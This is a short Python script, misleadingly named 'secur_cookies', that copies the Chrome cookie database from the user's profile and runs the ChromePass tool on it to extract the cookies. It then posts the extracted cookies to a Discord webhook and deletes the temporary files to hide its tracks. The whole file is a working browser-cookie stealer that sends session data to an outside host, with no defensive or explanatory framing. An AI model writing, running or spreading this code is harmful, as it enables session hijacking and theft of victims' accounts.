import requests
import os
import shutil
import discord
import subprocess

def secur_cookies():
    # Get the Chrome cookie database path
    cookie_db_path = os.path.expanduser('~') + '/AppData/Local/Google/Chrome/User Data/Default/Cookies'

    # Create a temporary directory to store the cookie database
    temp_dir = 'temp'
    os.makedirs(temp_dir, exist_ok=True)

    # Copy the cookie database to the temporary directory
    shutil.copy2(cookie_db_path, temp_dir)

    # Execute the ChromePass tool to extract the cookies
    subprocess.call(['ChromePass.exe', '/shtml', 'cookies.html', '/external', temp_dir])

    # Read the extracted cookies from the HTML file
    with open('cookies.html', 'r', encoding='utf-8') as file:
        cookies = file.read()

    # Send the cookies to the Discord webhook
    webhook_url = 'https://discord.com/api/webhooks/your_webhook_url_here'
    data = {
        'content': cookies
    }
    requests.post(webhook_url, data=data)

    # Remove the temporary files
    os.remove('cookies.html')
    shutil.rmtree(temp_dir)

secur_cookies()